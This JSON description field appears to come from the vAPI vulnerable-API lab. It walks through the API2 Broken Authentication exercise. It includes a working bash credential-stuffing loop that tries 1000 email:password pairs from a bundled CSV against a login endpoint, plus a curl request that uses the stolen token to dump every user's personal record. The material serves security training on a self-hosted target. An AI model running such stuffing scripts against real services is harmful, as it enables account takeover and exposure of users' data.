			"description": "Broken Authentication\r\n\r\nThere's no sign-up for API2 and no valid credentials are given to you directly. `Resources/API2_CredentialStuffing/creds.csv` in the repo ships 1000 email:password pairs; most don't work here, but one does. Credential stuffing is trying every pair from a breach dump against a login endpoint until one lands.\r\n\r\n### curl: try one pair\r\n```bash\r\ncurl -s -X POST https://{{host}}/vapi/api2/user/login \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"email\":\"savanna48@ortiz.com\",\"password\":\"zTyBwV/9\"}'\r\n```\r\nA hit returns `{\"success\":\"true\",\"token\":\"...\"}`.\r\n\r\n### curl: stuff the whole list\r\nRun from the repo root, against your own deployed host:\r\n```bash\r\nhost=vapi-bdo3.onrender.com\r\nwhile IFS=, read -r email password; do\r\n  resp=$(curl -s -X POST \"https://$host/vapi/api2/user/login\" \\\r\n    -H 'Content-Type: application/json' \\\r\n    -d \"{\\\"email\\\":\\\"$email\\\",\\\"password\\\":\\\"$password\\\"}\")\r\n  case \"$resp\" in\r\n    *'\"success\":\"true\"'*) echo \"HIT  $email:$password  ->  $resp\" ;;\r\n  esac\r\ndone < Resources/API2_CredentialStuffing/creds.csv\r\n```\r\nThis sends one request per line; it is not a rate-limit/DoS test, so leave delays out only on an instance you own.\r\n\r\n### curl: use the token\r\n`GET /vapi/api2/user/details` only checks that the token belongs to *some* user, then returns every user's record (email, address, city, country, token) instead of just the caller's own:\r\n```bash\r\ncurl -s https://{{host}}/vapi/api2/user/details \\\r\n  -H 'Authorization-Token: <token from the hit above>'\r\n```",
